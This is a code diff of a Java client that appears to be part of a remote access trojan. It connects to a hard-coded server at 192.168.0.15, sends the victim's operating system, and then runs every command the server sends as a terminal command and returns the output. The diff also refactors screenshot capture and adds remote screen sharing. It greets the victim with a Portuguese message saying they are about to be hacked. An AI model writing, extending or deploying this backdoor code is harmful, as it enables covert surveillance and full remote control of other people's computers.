@@ -1,7 +1,4 @@
-import javax.imageio.ImageIO;
 import java.awt.*;
-import java.awt.image.BufferedImage;
-import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.net.Socket;
 import java.util.Scanner;
@@ -13,7 +10,7 @@ public class Client {
     public static void main(String[] args) {
         try {
             System.out.println("Opa ta na hora de ser haskiado");
-            connection = new Connection(new Socket("localhost", 27015));
+            connection = new Connection(new Socket("192.168.0.15", 27015));
 
             MY_OS = OsCheck.getOperatingSystemType();
 
@@ -21,18 +18,28 @@ public class Client {
             connection.sendMessage(osMessage);
 
             while(true) {
-                String command = connection.readMessage().getCommand();
-
-                switch(command) {
-                    case "screen":
-                        sendScreenshot();
-                        break;
-                    default:
-                        runTerminalCommand(MY_OS, command);
-                }
+                handleServerCommand();
             }
         } catch(Exception e) {
             e.printStackTrace();
+        }
+    }
+
+    private static void handleServerCommand() throws AWTException, IOException {
+        String command = connection.readMessage().getCommand();
+
+        switch(command) {
+            case "screen":
+                ScreenUtils.sendScreenshot(connection, false);
+                break;
+            case "start-screenshare":
+                ScreenUtils.startScreenShare(connection);
+                break;
+            case "stop-screenshare":
+                ScreenUtils.stopScreenShare();
+                break;
+            default:
+                runTerminalCommand(MY_OS, command);
         }
     }
 
@@ -53,19 +60,5 @@ public class Client {
         connection.sendMessage(new Message("print", response.toString()));
     }
 
-    private static void sendScreenshot() throws AWTException, IOException {
-        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-        BufferedImage screenshot = new Robot().createScreenCapture(screenRect);
 
-        int mouseX = MouseInfo.getPointerInfo().getLocation().x;
-        int mouseY = MouseInfo.getPointerInfo().getLocation().y;
-
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ImageIO.write(screenshot, "png", baos);
-        baos.flush();
-        byte[] imageBytes = baos.toByteArray();
-        baos.close();
-
-        connection.sendMessage(new Message("screen", imageBytes, mouseX, mouseY));
-    }
 }
